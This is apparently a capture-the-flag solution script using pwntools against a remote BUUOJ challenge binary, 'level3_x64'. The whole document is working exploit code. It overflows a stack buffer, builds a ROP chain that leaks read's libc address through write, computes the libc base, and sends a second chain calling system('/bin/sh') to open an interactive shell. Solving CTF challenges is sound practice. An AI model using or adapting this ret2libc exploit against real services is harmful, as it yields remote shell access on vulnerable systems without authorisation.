from pwn import *
context(log_level='debug')
#io = process("./level3_x64")
io = remote("node3.buuoj.cn",29779)
elf = ELF("./level3_x64")
libc = ELF("./libc-x64-2.23.so")
write_plt = elf.plt['write']
read_got = elf.got['read']
main_addr = elf.sym['main']
pop_rdi_ret = 0x4006b3
pop_rsi_r15_ret = 0x4006b1

io.recv()
payload = 'a'*(0x88)+ p64(pop_rdi_ret)+p64(1)
payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(8)+p64(write_plt)+ p64(main_addr)

io.sendline(payload)
read_add = u64(io.recv()[0:8])
print hex(read_add)
base = read_add - libc.symbols["read"]
sys_add = base + libc.symbols["system"]
bin_sh = base + libc.search("/bin/sh").next()

payload = 'a'*(0x88)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr)
io.sendline(payload)
io.interactive()